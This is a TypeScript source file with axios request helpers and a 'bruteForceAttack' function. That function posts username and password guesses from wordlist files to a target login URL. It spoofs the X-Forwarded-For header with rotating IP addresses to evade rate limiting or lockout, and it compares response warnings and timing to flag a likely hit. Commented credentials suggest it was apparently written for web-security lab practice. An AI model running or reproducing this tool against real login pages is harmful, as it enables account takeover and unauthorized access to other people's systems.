import axios, { AxiosRequestConfig } from 'axios';
import { readFileSync } from 'fs';


export const getRequest = (targetURL: string, config?: AxiosRequestConfig) => {
	axios
		.get(targetURL, config)
		.then(response => {
			// return response;
			// console.log('REQUEST CONFIG:\n', response.config);
			// console.log('REQUEST:\n', response.request);
			console.log('RESPONSE STATUS:\n', response.status);
			console.log('RESPONSE STATUSTEXT:\n', response.statusText);
			console.log('RESPONSE HEADER:\n', response.headers);
			console.log('RESPONSE DATA:\n', response.data);
		})
		.catch(err => {
			console.log(err);
		});
};

export const postRequest = (targetURL: string, data?: any, config?: AxiosRequestConfig) => {
	axios
		.post(targetURL, data, config)
		.then(response => {
			// return response;
			console.log('RESPONSE STATUS:\n', response.status);
			console.log('RESPONSE STATUSTEXT:\n', response.statusText);
			console.log('RESPONSE HEADER:\n', response.headers);
			console.log('RESPONSE DATA:\n', response.data);
		})
		.catch(err => {
			console.log(err);
		});
};

export const bruteForceAttack = async (targetURL: string, payloadFile?: string) => {

	const payloadUsernames: string[] = readFileSync('src/payloads/usernames.txt').toString().split('\n');
	const payloadPasswords: string[] = readFileSync('src/payloads/passwords.txt').toString().split('\n');
	const payloadINT: string[] = readFileSync('src/payloads/int_1-100.txt').toString().split('\n');
	// const payload: string[] = readFileSync(`${payloadFile}`).toString().split('\n');
	const extractRegexStart: string = '-warning>';
	const extractRegexEnd: string = '</p>';
	const extractRegex: string = (extractRegexStart + '(.*?)' + extractRegexEnd);
	let extractedData: string = '';
	let extractedDataCache: string = '';
	let config: AxiosRequestConfig = undefined as any;

	// if (payloadUsernames.length == payloadPasswords.length) return;

	for (let i = 0; i < payloadUsernames.length; i++) {
		// const data: string = `username=${payloadUsernames[i]}&password=pass`;
		const data: string = `username=apps&password=${payloadPasswords[i]}`;
		// const data: string = 'username=wiener&password=peter';
		config = {
			headers: {
				'X-Forwarded-For': `129.0.0.${payloadINT[i]}`,
			},
		};

		const requestStartAt: number = performance.now();
		await axios
			.post(targetURL, data, config)
			.then(response => {
				const requestEndAt: number = performance.now();
				const requestDuration: number = requestEndAt - requestStartAt;
				// console.log('TRY #' + (i + 1));
				// console.log(response.data);
				if (response.data.includes(extractRegexStart)) {
					extractedData = `${response.data.match(extractRegex)[1]}`;
				} else {
					extractedData = '### NO REGEX EXTRACT ###';
				}
				console.log(
					`
Try #${i + 1} | data: '${data}'
RESPONSE:
Status: ${response.status} ${response.statusText}
Extracted data: ${extractedData}
Response Time: ${requestDuration}
					`,
				);
			})
			.catch(err => {
				console.log(err);
			});
		if ((i !== 0) && (extractedDataCache !== extractedData)) {
			console.log(`CHANGE FOUND AT TRY #${i + 1}\nMaybe a Hit?`);
		} else {
			extractedDataCache = extractedData;
		}
	}
};